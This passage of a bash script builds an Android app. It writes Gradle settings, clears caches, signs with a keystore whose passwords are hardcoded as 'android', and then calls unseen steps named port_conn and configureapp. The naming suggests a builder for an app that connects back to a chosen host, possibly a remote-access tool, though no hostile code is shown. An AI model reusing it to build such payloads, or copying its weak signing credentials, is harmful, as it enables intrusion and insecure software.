org.gradle.jvmargs=-Xmx2048m -Xss512k -Dfile.encoding=UTF-8
android.useAndroidX=true
android.enableJetifier=true
org.gradle.parallel=true
org.gradle.daemon=false
org.gradle.configureondemand=true
EOF
}

clear_gradle_cache() {
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cleaning Gradle cache...\e[0m\n"
    rm -rf ~/.gradle/caches/
}

start() {
    if [[ -e "app/sendlink" ]]; then
        rm -rf app/sendlink 
    fi
    
    # Clean previous build if exists
    if [[ -d "app" ]]; then
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cleaning previous build...\e[0m\n"
        rm -rf app/
    fi
    
    # Create app directory
    mkdir -p app
    
    # Create keystore if not exists
    if [[ ! -e key.keystore ]]; then
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Creating keystore...\e[0m\n"
        keytool -genkey -v -keystore key.keystore -alias androidkey -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=, OU=, O=, L=, S=, C=" 2>/dev/null
    fi
    
    # Use ANDROID_HOME if set, else default to /root/Android/Sdk
    default_sdk_dir="${ANDROID_HOME:-/root/Android/Sdk}"
    read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default $default_sdk_dir): \e[0m' sdk_dir

    sdk_dir="${sdk_dir:-${default_sdk_dir}}"

    if [[ ! -d $sdk_dir ]]; then
        printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
        sleep 1
        start
    else
        # Write the correct SDK path to local.properties
        echo "sdk.dir=$sdk_dir" > app/local.properties
        clear_gradle_cache
        fix_androidx_issue
        port_conn
        configureapp
        build
    fi
}

# Main execution
banner
dependencies
start